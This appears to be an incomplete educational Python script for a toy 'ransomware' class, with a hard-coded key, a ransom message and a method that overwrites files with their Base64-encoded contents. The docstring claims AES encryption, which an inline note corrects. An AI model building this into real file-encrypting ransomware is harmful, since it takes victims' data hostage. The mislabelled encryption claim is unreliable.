#!/usr/bin/env python3
# Shebang
'''
WARNING!!! Do not run this command outside of this directory,
and do not use this code anywhere else.
This script is the simple ransomeware
that will encrypt files within the same directory
'''

# Importing important packages

import logging # For logging debug messages.
import os # For interacting with the operating system (e.g., file paths).
import sys # For accessing system-specific parameters and functions.
import base64 # For encoding and decoding data using Base64.

class Ransomware:
    #  This class represents file encrypting ransomware.

    # Constructor for this class
    def __init__(self, name):
        self._name = name

    # Getter for name Property
    @property
    def name(self):
        # Name of the malware. 
        return self._name
    
    # Setter for name Property
    @name.setter
    def name(self, new_name):
        # Set a new name
        self._name = new_name

    # Key for encryption
    @property
    def key(self):
        return "ransomware_key"

    # Prompts the user to input a decryption key.
    def obtain_key(self):
        """ Obtain key from a user. """
        return input("Please enter a key: ")
    
    # Informing user
    def ransom_user(self):
        """ Inform user about encryption of his files. """
        print("Hi, all your files has been encrypted.")

    def encrypt_file(self, filename):
        """ Encrypt the given file with AES encryption algorithm.
        :param str filename: Name of the file.

        Note: The docstring mentions AES encryption, 
        but the code uses Base64 encoding, 
        which is not encryption but encoding.
        """
        # Load the content of file.
        with open(filename, 'r') as file:
            content = file.read()

        # Encripting the file
            encrypted_data = base64.b64encode(content.encode('utf-8'))

        # Rewriting the file with the encoded content.
        with open(filename, 'w') as file:
            file.write(encrypted_data.decode('utf-8'))

